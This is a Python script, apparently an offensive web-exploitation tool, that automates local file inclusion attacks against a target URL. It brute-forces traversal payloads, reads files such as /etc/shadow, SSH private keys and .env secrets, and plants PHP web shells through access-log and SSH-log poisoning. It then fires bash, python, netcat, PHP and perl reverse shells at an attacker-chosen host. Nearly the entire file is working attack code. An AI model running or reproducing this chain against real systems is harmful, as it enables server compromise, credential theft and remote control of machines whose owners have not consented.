#!/usr/bin/env python3
"""
COMPREHENSIVE LFI CHECKER - WORKING
"""
import requests
import urllib.parse
import base64
import sys
import time
import re
import socket
import subprocess
import argparse

class ComprehensiveLFIChecker:
    def __init__(self, url, lhost=None, lport=4444, timeout=5, workers=20):
        self.url = url.rstrip('/')
        self.lhost = lhost
        self.lport = lport
        self.timeout = timeout
        self.workers = workers
        
        self.session = requests.Session()
        self.session.headers = {'User-Agent': 'Mozilla/5.0'}
        
        self.results = {
            'lfi_params': [],
            'php_wrappers': [],
            'readable_files': [],
            'log_poisoning': [],
            'ssh_poisoning': False,
            'rfi': False
        }
        
        self._load_payloads()
    
    def _load_payloads(self):
        self.lfi_params = [
            'file', 'page', 'path', 'load', 'include', 'doc', 'view', 'template',
            'f', 'p', 'filename', 'name', 'input', 'src', 'lang', 'module',
            'cat', 'dir', 'action', 'board', 'date', 'detail', 'download',
            'prefix', 'include_path', 'mod', 'show', 'data', 'loc',
            'read', 'ret', 'target', 'text', 'file_name', 'file_path',
            'menu', 'content', 'document_root', 'site', 'nav', 'next',
            'open', 'option', 'preview', 'route', 'section', 'selection',
            'settings', 'source', 'subject', 'theme', 'url', 'wp',
            'controller', 'action', 'method', 'format', 'layout',
            'component', 'itemid', 'task',
            'endpoint', 'resource', 'uri'
        ]
        
        self.lfi_payloads = [
            '/etc/passwd',
            '../../../../etc/passwd',
            '../../../../../etc/passwd',
            '../../../../../../etc/passwd',
            '..%2f..%2f..%2f..%2fetc%2fpasswd',
            '..%252f..%252f..%252f..%252fetc%252fpasswd',
            '..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
            '....//....//....//....//etc/passwd',
            '/etc/passwd%00',
            '/etc/passwd%00.jpg',
            '/etc/passwd%00.txt',
            '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            'C:\\windows\\system32\\drivers\\etc\\hosts',
            '../../../../windows/system32/drivers/etc/hosts',
            'index.php', 'file.php', 'page.php',
            '/var/log/auth.log',
            '/proc/self/environ'
        ]
        
        self.php_wrappers = [
            ('php://filter/convert.base64-encode/resource=/etc/passwd', 'Base64 Filter'),
            ('php://filter/read=convert.base64-encode/resource=/etc/passwd', 'Base64 Read'),
            ('php://filter/string.rot13/resource=/etc/passwd', 'Rot13 Filter'),
            ('data://text/plain,<?php echo "TEST"; ?>', 'Data Wrapper'),
            ('data://text/plain;base64,PD9waHAgZWNobyAiVEVTVCI7ID8+', 'Data Base64'),
            ('php://input', 'PHP Input'),
            ('expect://whoami', 'Expect Wrapper'),
            ('zip:///etc/passwd%23test', 'Zip Wrapper')
        ]
        
        self.interesting_files = [
            '/etc/passwd', '/etc/shadow', '/etc/hosts', '/etc/hostname',
            '/etc/ssh/sshd_config', '/etc/sudoers', '/etc/crontab',
            '/etc/apache2/apache2.conf', '/etc/nginx/nginx.conf',
            '/etc/php/7.4/apache2/php.ini', '/etc/php/8.0/apache2/php.ini', '/etc/php/8.1/apache2/php.ini',
            '/etc/mysql/my.cnf',
            '/var/www/html/config.php', '/var/www/html/wp-config.php',
            '/var/www/html/.env', '/var/www/html/settings.php',
            '/var/www/html/database.php', '/var/www/html/web.config',
            '/var/log/auth.log', '/var/log/apache2/access.log',
            '/var/log/apache2/error.log', '/var/log/nginx/access.log',
            '/var/log/syslog', '/proc/self/environ',
            '/root/.bash_history', '/root/.ssh/id_rsa',
            '/home/root/.bash_history', '/home/root/.ssh/id_rsa',
            '/home/www-data/.bash_history', '/home/www-data/.ssh/id_rsa',
            'config.php.bak', 'database.php.old', '.env.backup'
        ]
    
    def check_lfi(self):
        print(f"[*] Checking {len(self.lfi_params)} parameters...")
        
        url_params = []
        if '?' in self.url:
            query = self.url.split('?')[1]
            for param in query.split('&'):
                if '=' in param:
                    url_params.append(param.split('=')[0])
        
        all_params = list(set(self.lfi_params + url_params))
        found = []
        
        for param in all_params:
            for payload in self.lfi_payloads:
                test_url = self._build_url(param, payload)
                try:
                    r = requests.get(test_url, timeout=self.timeout)
                    if r.status_code == 200:
                        content = r.text
                        if 'root:x:' in content or 'daemon:x:' in content or 'bin:x:' in content:
                            if not any(err in content.lower() for err in ['error', 'warning', 'not found']):
                                print(f"[+] LFI: {param}={payload}")
                                found.append({
                                    'param': param,
                                    'payload': payload,
                                    'url': test_url
                                })
                                break
                except:
                    continue
        
        self.results['lfi_params'] = found
        return found
    
    def check_php_wrappers(self, param):
        if not param:
            return []
            
        print(f"[*] Testing PHP wrappers...")
        working = []
        
        for wrapper, name in self.php_wrappers:
            test_url = self._build_url(param, wrapper)
            
            try:
                if wrapper == "php://input":
                    r = requests.post(test_url, data='<?php echo "WRAPPER_TEST"; ?>', timeout=self.timeout)
                else:
                    r = requests.get(test_url, timeout=self.timeout)
                
                if r and r.status_code == 200:
                    if wrapper.startswith("php://filter"):
                        try:
                            decoded = base64.b64decode(r.text).decode()
                            if 'root:x:' in decoded:
                                print(f"[+] {name} works")
                                working.append((name, wrapper, test_url))
                        except:
                            pass
                    elif wrapper.startswith("data://"):
                        if 'WRAPPER_TEST' in r.text or 'TEST' in r.text:
                            print(f"[+] {name} works")
                            working.append((name, wrapper, test_url))
                    elif wrapper == "php://input":
                        if 'WRAPPER_TEST' in r.text:
                            print(f"[+] {name} works")
                            working.append((name, wrapper, test_url))
            except:
                continue
        
        self.results['php_wrappers'] = working
        return working
    
    def enumerate_files(self, param):
        if not param:
            return []
            
        print(f"[*] Enumerating files...")
        found = []
        
        for file_path in self.interesting_files:
            test_url = self._build_url(param, file_path)
            try:
                r = requests.get(test_url, timeout=self.timeout)
                if r.status_code == 200:
                    content = r.text.strip()
                    if not content or any(err in content.lower() for err in ['error', 'not found', 'no such']):
                        continue
                    if len(content) > 10:
                        print(f"[+] Readable: {file_path}")
                        found.append((file_path, content[:500]))
            except:
                pass
        
        self.results['readable_files'] = found
        return found
    
    def check_log_poisoning(self, param):
        if not param:
            return []
            
        print("[*] Checking log poisoning...")
        
        logs = ['/var/log/auth.log', '/var/log/apache2/access.log', '/var/log/apache2/error.log', '/proc/self/environ']
        readable_logs = []
        
        for log in logs:
            test_url = self._build_url(param, log)
            try:
                r = requests.get(test_url, timeout=self.timeout)
                if r.status_code == 200 and len(r.text) > 50:
                    readable_logs.append(log)
                    print(f"[+] Readable log: {log}")
            except:
                continue
        
        if not readable_logs:
            return []
        
        successful = []
        
        for log in readable_logs:
            print(f"[*] Testing poisoning on {log}...")
            
            poison_methods = [
                ('User-Agent', {'User-Agent': '<?php system($_GET["cmd"]); ?>'}),
                ('Referer', {'Referer': '<?php echo shell_exec($_GET["c"]); ?>'}),
                ('X-Forwarded-For', {'X-Forwarded-For': '<?php passthru($_GET["exec"]); ?>'})
            ]
            
            for method, headers in poison_methods:
                base_url = self.url.split('?')[0]
                try:
                    requests.get(base_url, headers=headers, timeout=2)
                    time.sleep(2)
                    
                    check_url = self._build_url(param, log)
                    r = requests.get(check_url, timeout=self.timeout)
                    
                    if r and '<?php' in r.text:
                        print(f"[+] Poisoned via {method}")
                        
                        test_cmd = "echo POISON_TEST_123"
                        for cmd_param in ['cmd', 'c', 'exec']:
                            test_url = f"{check_url}&{cmd_param}={urllib.parse.quote(test_cmd)}"
                            try:
                                r = requests.get(test_url, timeout=3)
                                if r and 'POISON_TEST_123' in r.text:
                                    print(f"[+] RCE via {cmd_param}")
                                    successful.append({
                                        'log': log,
                                        'method': method,
                                        'param': cmd_param,
                                        'url': check_url
                                    })
                                    break
                            except:
                                continue
                except:
                    continue
        
        self.results['log_poisoning'] = successful
        return successful
    
    def check_ssh_poisoning(self, param, log_file='/var/log/auth.log'):
        if not param:
            return False
            
        print("[*] Checking SSH log poisoning...")
        
        ip_match = re.search(r'\d+\.\d+\.\d+\.\d+', self.url)
        if not ip_match:
            return False
            
        target_ip = ip_match.group(0)
        php_code = '<?php system($_GET["ssh_cmd"]); ?>'
        
        sent = False
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, 22))
            sock.sendall(f'{php_code}\r\n'.encode())
            sock.close()
            sent = True
        except:
            try:
                cmd = f'echo "{php_code}" | timeout 2 nc {target_ip} 22'
                subprocess.run(cmd, shell=True, capture_output=True)
                sent = True
            except:
                pass
        
        if not sent:
            return False
        
        time.sleep(3)
        
        test_url = f"{self._build_url(param, log_file)}&ssh_cmd=echo+SSH_TEST"
        try:
            r = requests.get(test_url, timeout=5)
            if r and 'SSH_TEST' in r.text:
                print("[+] SSH log poisoning successful!")
                self.results['ssh_poisoning'] = True
                return True
        except:
            pass
        
        return False
    
    def check_rfi(self, param):
        if not param or not self.lhost:
            return False
            
        print("[*] Checking RFI...")
        
        test_urls = [
            f'http://{self.lhost}:8000/test.php',
            f'\\\\{self.lhost}\\share\\test.php',
            f'//{self.lhost}/test.txt'
        ]
        
        for rfi_url in test_urls:
            test_url = self._build_url(param, rfi_url)
            try:
                r = requests.get(test_url, timeout=5)
                if r.status_code == 200:
                    print(f"[+] RFI might work: {rfi_url}")
                    self.results['rfi'] = True
                    return True
            except:
                continue
        
        return False
    
    def execute_shells(self, param):
        if not self.lhost or not param:
            return
            
        print(f"\n[*] Executing shells to {self.lhost}:{self.lport}")
        print(f"[*] Start listener: nc -lvnp {self.lport}")
        
        shells_sent = 0
        
        reverse_shells = {
            'bash': f'bash -c "bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"',
            'python': f'python3 -c \'import socket,os,pty;s=socket.socket();s.connect(("{self.lhost}",{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'',
            'nc': f'nc -e /bin/sh {self.lhost} {self.lport}',
            'php': f'php -r \'$s=fsockopen("{self.lhost}",{self.lport});exec("/bin/sh -i <&3 >&3 2>&3");\'',
            'perl': f'perl -e \'use Socket;$i="{self.lhost}";$p={self.lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\''
        }
        
        for name, wrapper, url in self.results.get('php_wrappers', []):
            if 'data://' in wrapper:
                for shell_name, shell_template in reverse_shells.items():
                    try:
                        php_code = f'<?php system("{shell_template}"); ?>'
                        if 'base64' in wrapper:
                            encoded = base64.b64encode(php_code.encode()).decode()
                            payload = f"data://text/plain;base64,{encoded}"
                        else:
                            payload = f"data://text/plain,{urllib.parse.quote(php_code)}"
                        
                        shell_url = self._build_url(param, payload)
                        requests.get(shell_url, timeout=2)
                        print(f"[+] Sent {shell_name} via wrapper")
                        shells_sent += 1
                    except:
                        pass
        
        for poison in self.results.get('log_poisoning', []):
            for shell_name, shell_template in reverse_shells.items():
                try:
                    shell_url = f"{poison['url']}&{poison['param']}={urllib.parse.quote(shell_template)}"
                    requests.get(shell_url, timeout=2)
                    print(f"[+] Sent {shell_name} via log poisoning")
                    shells_sent += 1
                except:
                    pass
        
        if self.results.get('ssh_poisoning'):
            for shell_name, shell_template in reverse_shells.items():
                try:
                    shell_url = f"{self._build_url(param, '/var/log/auth.log')}&ssh_cmd={urllib.parse.quote(shell_template)}"
                    requests.get(shell_url, timeout=2)
                    print(f"[+] Sent {shell_name} via SSH poisoning")
                    shells_sent += 1
                except:
                    pass
        
        print(f"\n[*] Sent {shells_sent} shell attempts. Check listener!")
    
    def _build_url(self, param, value):
        if '?' in self.url:
            return f"{self.url}&{param}={urllib.parse.quote(value)}"
        else:
            return f"{self.url}?{param}={urllib.parse.quote(value)}"
    
    def show_results(self):
        print("\n" + "="*70)
        print("[RESULTS]")
        print("="*70)
        
        if self.results['lfi_params']:
            print(f"\n[+] LFI PARAMETERS ({len(self.results['lfi_params'])}):")
            for lfi in self.results['lfi_params'][:3]:
                print(f"  {lfi['param']}={lfi['payload']}")
        
        if self.results['php_wrappers']:
            print(f"\n[+] PHP WRAPPERS ({len(self.results['php_wrappers'])}):")
            for name, wrapper, url in self.results['php_wrappers']:
                print(f"  {name}: {url}")
        
        if self.results['readable_files']:
            print(f"\n[+] READABLE FILES ({len(self.results['readable_files'])}):")
            for file_path, content in self.results['readable_files'][:5]:
                print(f"  {file_path}")
        
        if self.results['log_poisoning']:
            print(f"\n[+] LOG POISONING ({len(self.results['log_poisoning'])}):")
            for poison in self.results['log_poisoning']:
                print(f"  {poison['url']}&{poison['param']}=COMMAND")
        
        if self.results.get('ssh_poisoning'):
            print(f"\n[+] SSH POISONING: SUCCESS")
        
        if self.results.get('rfi'):
            print(f"\n[+] RFI: WORKS")
        
        print("\n" + "="*70)
        print("[MANUAL EXPLOITATION]")
        print("="*70)
        
        if self.results['lfi_params']:
            param = self.results['lfi_params'][0]['param']
            print(f"\n1. BASIC LFI:")
            print(f"   {self.url}?{param}=FILE_PATH")
            print(f"   Example: {self.url}?{param}=/etc/passwd")
        
        if self.results['php_wrappers']:
            print(f"\n2. PHP WRAPPERS:")
            for name, wrapper, url in self.results['php_wrappers'][:2]:
                print(f"   {name}: {url}")
        
        if self.results['log_poisoning'] or self.results.get('ssh_poisoning'):
            print(f"\n3. LOG POISONING RCE:")
            if self.results['log_poisoning']:
                for poison in self.results['log_poisoning'][:2]:
                    print(f"   {poison['url']}&{poison['param']}=COMMAND")
            if self.results.get('ssh_poisoning'):
                print(f"   {self._build_url(param, '/var/log/auth.log')}&ssh_cmd=COMMAND")
        
        if self.lhost:
            print(f"\n4. REVERSE SHELLS (LHOST: {self.lhost}:{self.lport}):")
            print(f"   Listener: nc -lvnp {self.lport}")
            
            shells = [
                ('bash', f'bash -c "bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"'),
                ('python', f'python3 -c \'import socket,os,pty;s=socket.socket();s.connect(("{self.lhost}",{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''),
                ('nc', f'nc -e /bin/sh {self.lhost} {self.lport}'),
                ('php', f'php -r \'$s=fsockopen("{self.lhost}",{self.lport});exec("/bin/sh -i <&3 >&3 2>&3");\''),
                ('perl', f'perl -e \'use Socket;$i="{self.lhost}";$p={self.lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'')
            ]
            
            for name, shell in shells:
                print(f"   {name}: {shell}")
            
            if self.results['lfi_params']:
                param = self.results['lfi_params'][0]['param']
                print(f"\n   Usage: {self.url}?{param}=/var/log/auth.log&ssh_cmd=SHELL_COMMAND")
        
        print("\n" + "="*70)
    
    def run(self):
        print(f"[*] Target: {self.url}")
        if self.lhost:
            print(f"[*] LHOST: {self.lhost}:{self.lport}")
        print("")
        
        lfi_results = self.check_lfi()
        if not lfi_results:
            print("[-] No LFI found")
            return False
        
        param = lfi_results[0]['param']
        
        self.check_php_wrappers(param)
        self.enumerate_files(param)
        self.check_log_poisoning(param)
        self.check_ssh_poisoning(param)
        
        if self.lhost:
            self.check_rfi(param)
            self.execute_shells(param)
        
        self.show_results()
        return True

def main():
    parser = argparse.ArgumentParser(description='Comprehensive LFI Checker')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-lh', '--lhost', help='Your IP for reverse shell')
    parser.add_argument('-lp', '--lport', type=int, default=4444, help='Reverse shell port')
    parser.add_argument('-t', '--timeout', type=int, default=5, help='Timeout')
    
    args = parser.parse_args()
    
    if not args.url.startswith(('http://', 'https://')):
        print("[!] URL must start with http:// or https://")
        sys.exit(1)
    
    checker = ComprehensiveLFIChecker(args.url, args.lhost, args.lport, args.timeout)
    checker.run()

if __name__ == "__main__":
    main()
